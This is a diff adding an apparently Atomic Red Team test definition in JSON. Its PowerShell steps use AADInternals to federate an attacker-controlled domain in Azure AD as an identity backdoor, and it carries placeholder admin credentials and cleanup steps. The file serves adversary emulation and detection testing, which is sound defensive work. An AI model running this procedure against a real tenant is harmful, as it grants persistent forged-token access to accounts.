@@ -1,0 +1,117 @@
+{
+  "id": "8906c5d0-3ee5-4f63-897a-f6cafd3fdbb7",
+  "name": "Add Federation to Azure AD",
+  "description": "Add a new federated domain to Azure AD using PowerShell.\nThe malicious domain to be federated must be configured beforehand (outside of the scope of this test):\n    1. Open Azure Portal\n    2. Add a new \"custom domain name\"\n    3. Verify the domain by following instructions (i.e. create the requested DNS record)\n",
+  "platforms": [
+    "azure-ad"
+  ],
+  "steps": [
+    {
+      "id": "18360c9b-53f8-4887-ad66-7bede9333582",
+      "type": "execute-command",
+      "data": {
+        "command": "Import-Module AzureAD\nImport-Module AADInternals\n\n$PWord = ConvertTo-SecureString -String \"#{azure_password}\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{azure_username}\", $Pword\n\ntry {\n  Connect-AzureAD -Credential $Credential -ErrorAction Stop \u003e $null\n}\ncatch {\n  Write-Host \"Error: AzureAD could not connect\"\n  exit 1\n}\n\ntry {\n  $domain = Get-AzureADDomain -Name \"#{domain_name}\"\n}\ncatch {\n  Write-Host \"Error: domain \"\"#{domain_name}\"\" not found\"\n  exit 1\n}\nif (-Not $domain.IsVerified) {\n  Write-Host \"Error: domain \"\"#{domain_name}\"\" not verified\"\n  exit 1\n}\n\nif ($domain.AuthenticationType -eq \"Federated\") {\n  Write-Host \"Error: domain \"\"#{domain_name}\"\" already federated. Try with a different domain or re-create it before.\"\n  exit 1\n}\n\n$at = Get-AADIntAccessTokenForAADGraph -Credentials $Credential\nif (-Not $at) {\n  Write-Host \"Error: AADInternals could not connect\"\n  exit 1\n}\n\n$new = ConvertTo-AADIntBackdoor -AccessToken $at -DomainName \"#{domain_name}\"\nif ($new) {\n  Write-Host \"Federation successfully added to Azure AD\"\n  Write-Host $new\n}\nelse {\n  Write-Host \"The federation setup failed\"\n}\n\nWrite-Host \"End of federation configuration.\"\n",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "a2a80751-75dd-4030-b4ea-098ce9a87abb",
+      "type": "execute-command",
+      "data": {
+        "command": "try {\n  Import-Module AzureAD -ErrorAction Ignore\n\n  $PWord = ConvertTo-SecureString -String \"#{azure_password}\" -AsPlainText -Force\n  $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{azure_username}\", $Pword\n  Connect-AzureAD -Credential $Credential -ErrorAction Ignore \u003e $null\n\n  Remove-AzureADDomain -Name \"#{domain_name}\" -ErrorAction Ignore\n} catch {}\n",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "45e3c1da-eff4-4f37-ae0e-4f9320aece54",
+      "name": "Check dependency 1/1",
+      "description": "AzureAD and AADInternals Powershell modules must be installed.\n",
+      "type": "execute-command",
+      "data": {
+        "command": "if ((Get-Module -ListAvailable -Name AzureAD) -And (Get-Module -ListAvailable -Name AADInternals)) {exit 0} else {exit 1}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "60742435-b7a9-4d90-8d3b-db1dcab09053",
+      "name": "Resolve dependency 1/1",
+      "description": "AzureAD and AADInternals Powershell modules must be installed.\n",
+      "type": "execute-command",
+      "data": {
+        "command": "Install-Module -Name AzureAD -Force\nInstall-Module -Name AADInternals -Force\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "5c7916a5-b1c5-412a-91d2-018eff1db12d",
+      "name": "Re-check dependency 1/1",
+      "description": "AzureAD and AADInternals Powershell modules must be installed.\n",
+      "type": "execute-command",
+      "data": {
+        "command": "if ((Get-Module -ListAvailable -Name AzureAD) -And (Get-Module -ListAvailable -Name AADInternals)) {exit 0} else {exit 1}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    }
+  ],
+  "flows": [
+    {
+      "s": "18360c9b-53f8-4887-ad66-7bede9333582",
+      "p": "on-success",
+      "o": "a2a80751-75dd-4030-b4ea-098ce9a87abb"
+    },
+    {
+      "s": "18360c9b-53f8-4887-ad66-7bede9333582",
+      "p": "on-failure",
+      "o": "a2a80751-75dd-4030-b4ea-098ce9a87abb"
+    },
+    {
+      "s": "45e3c1da-eff4-4f37-ae0e-4f9320aece54",
+      "p": "on-success",
+      "o": "18360c9b-53f8-4887-ad66-7bede9333582"
+    },
+    {
+      "s": "45e3c1da-eff4-4f37-ae0e-4f9320aece54",
+      "p": "on-failure",
+      "o": "60742435-b7a9-4d90-8d3b-db1dcab09053"
+    },
+    {
+      "s": "60742435-b7a9-4d90-8d3b-db1dcab09053",
+      "p": "on-success",
+      "o": "5c7916a5-b1c5-412a-91d2-018eff1db12d"
+    },
+    {
+      "s": "5c7916a5-b1c5-412a-91d2-018eff1db12d",
+      "p": "on-failure",
+      "o": "18360c9b-53f8-4887-ad66-7bede9333582"
+    }
+  ],
+  "tags": [
+    "T1484.002",
+    "atomic-red-team"
+  ],
+  "input_arguments": [
+    {
+      "name": "azure_password",
+      "type": "string",
+      "description": "Password of azure_username",
+      "value": "iamthebatman"
+    },
+    {
+      "name": "domain_name",
+      "type": "string",
+      "description": "Malicious federated domain name",
+      "value": "contoso.com"
+    },
+    {
+      "name": "azure_username",
+      "type": "string",
+      "description": "Username of a privileged Azure AD account such as External Identity Provider Administrator or Global Administrator roles",
+      "value": "bruce.wayne@contosocloud.com"
+    }
+  ]
+}
